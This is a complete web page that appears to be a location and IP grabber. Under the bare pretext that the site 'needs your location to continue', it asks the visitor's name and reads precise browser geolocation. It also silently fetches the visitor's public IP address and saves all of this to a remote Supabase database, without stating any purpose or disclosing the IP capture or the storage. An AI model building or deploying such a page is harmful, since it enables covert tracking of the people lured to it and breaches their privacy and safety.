<!DOCTYPE html>
<html lang="en">
<head>

  <link
    rel="stylesheet"
    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
  />

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Location Access</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px 20px;
      background: #f5f5f5;
    }

    .box {
      max-width: 400px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0,0,0,.1);
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }

    #allow {
      background: #007aff;
      color: white;
    }

    #deny {
      background: #ddd;
      color: #222;
    }

    #result {
      margin-top: 25px;
      word-break: break-word;
    }
  </style>

</head>

<body>

  <div class="box">

    <h2>Location Access</h2>

    <p>
      This website needs your location to continue.
    </p>

    <button id="allow">Allow</button>
    <button id="deny">Not Allow</button>

    <div id="result"></div>

    <div id="map" style="
      height: 400px;
      margin-top: 25px;
      border-radius: 15px;
      overflow: hidden;
    "></div>

  </div>

  <script>

    const allowButton = document.getElementById("allow");
    const denyButton = document.getElementById("deny");
    const result = document.getElementById("result");

    const SUPABASE_URL =
      "https://mxichdljcrlcomnhkcin.supabase.co";

    const SUPABASE_KEY =
      "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";

    const supabase =
      window.supabase.createClient(
        SUPABASE_URL,
        SUPABASE_KEY
      );


    allowButton.addEventListener("click", () => {

      const name = prompt("Enter your name:");

      if (!name) {
        result.innerHTML = "Please enter your name.";
        return;
      }

      if (!navigator.geolocation) {
        result.innerHTML =
          "Geolocation is not supported by your browser.";
        return;
      }

      result.innerHTML =
        "Requesting your location...";


      navigator.geolocation.getCurrentPosition(

        async function(position) {

          const latitude =
            position.coords.latitude;

          const longitude =
            position.coords.longitude;


          // Get Public IP
          let ipAddress = null;

          try {

            const ipResponse =
              await fetch(
                "https://api.ipify.org?format=json"
              );

            if (ipResponse.ok) {

              const ipData =
                await ipResponse.json();

              ipAddress = ipData.ip;

              console.log(
                "Public IP:",
                ipAddress
              );

            }

          } catch (ipError) {

            console.log(
              "Could not get Public IP:",
              ipError
            );

          }


          // Show Map
          const map =
            L.map("map").setView(
              [latitude, longitude],
              16
            );


          L.tileLayer(
            "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
            {
              attribution:
                "&copy; OpenStreetMap contributors"
            }
          ).addTo(map);


          L.marker(
            [latitude, longitude]
          )
            .addTo(map)
            .bindPopup(
              "Your current location"
            )
            .openPopup();


          // Save Location
          result.innerHTML =
            "Saving your location...";


          const { data, error } =
            await supabase
              .from("locations")
              .insert([
                {
                  name: name,
                  latitude: latitude,
                  longitude: longitude,
                  ip_address: ipAddress
                }
              ]);


          if (error) {

            result.innerHTML =
              "Could not save location.";

            console.error(
              "Supabase error:",
              error
            );

            return;
          }


          result.innerHTML = `
            <h3>Location received ✅</h3>
            <p>
              Your location has been received successfully.
            </p>
          `;


          console.log(
            "Saved successfully:",
            {
              name: name,
              latitude: latitude,
              longitude: longitude,
              ip_address: ipAddress
            }
          );

        },


        function(error) {

          if (error.code === 1) {

            result.innerHTML =
              "Location permission was denied.";

          }

          else if (error.code === 2) {

            result.innerHTML =
              "Location is unavailable.";

          }

          else if (error.code === 3) {

            result.innerHTML =
              "Location request timed out.";

          }

          else {

            result.innerHTML =
              "Could not get your location.";

          }

        },


        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }

      );

    });


    denyButton.addEventListener("click", () => {

      result.innerHTML =
        "Location access was not allowed.";

    });

  </script>

</body>
</html>
